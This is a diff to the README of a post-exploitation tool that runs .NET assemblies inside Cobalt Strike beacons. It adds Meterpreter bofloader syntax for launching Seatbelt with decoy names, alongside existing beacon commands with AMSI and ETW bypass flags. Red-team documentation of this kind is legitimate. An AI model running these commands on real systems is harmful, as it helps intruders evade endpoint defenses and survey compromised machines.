@@ -142,6 +142,17 @@ beacon> inlineExecute-Assembly --dotnetassembly /root/Desktop/simpleMain.exe --m
 beacon> inlineExecute-Assembly --dotnetassembly /root/Desktop/Seatbelt.exe --assemblyargs AntiVirus AppLocker --amsi --etw --appdomain forRealLegit --mailslot forRealLegit
 ```
 
+### Use Case
+
+> *Execute .NET assembly (Meterpreter Version)*
+
+### Syntax
+
+```
+meterpreter > load bofloader
+meterpreter > execute_bof path/to/inlineExecute-Assemblyx64.o --format-string ziiiiizzzb "totesLegit" 0 0 0 0 1 "totesLegit" "totesLegit" "" file:/root/Desktop/Seatbelt.exe
+```
+
 ## Caveats
 
 1.	While I have tried to make this as stable as possible, there are no guarantees things will never crash and beacons won’t die. We don’t have the added luxury of fork and run where if something goes wrong our beacon lives. This is the tradeoff with BOFs.  With that said, I can’t stress how important it is that you test your assemblies beforehand to make sure they will work properly with the tool. 
